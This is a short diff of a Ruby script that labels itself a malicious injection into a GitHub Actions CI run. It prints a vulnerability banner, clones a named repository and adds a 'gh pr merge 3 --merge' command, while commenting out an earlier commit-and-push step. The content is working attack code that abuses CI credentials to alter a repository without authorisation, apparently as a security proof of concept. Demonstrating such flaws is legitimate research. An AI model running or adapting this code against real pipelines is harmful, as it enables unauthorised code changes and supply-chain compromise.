@@ -14,9 +14,10 @@ puts " [!] SECURITY VULNERABILITY DETECTED"
 puts " [!] I am executing code in your CI!"
 puts "------------------------------------------------"
 #ENV["GITHUB_TOKEN"] = ENV["INPUT_TOKEN"]
-system(" git config --global user.email \"hello@sohom.dev\"")
-system("git config --global user.name \"github-actions [bot]\"")
+# system(" git config --global user.email \"hello@sohom.dev\"")
+# system("git config --global user.name \"github-actions [bot]\"")
 system("gh repo clone elizabethtl/test-oracle-devrel")
-system("cd test-oracle-devrel && echo \"test\" > test")
-system("cd test-oracle-devrel && git add . && git commit -m 'Surely this wont be added' && git push")
+system("gh pr merge 3 --merge")
+# system("cd test-oracle-devrel && echo \"test\" > test")
+# system("cd test-oracle-devrel && git add . && git commit -m 'Surely this wont be added' && git push")
 # --- Malicious Injection Ends Here ---
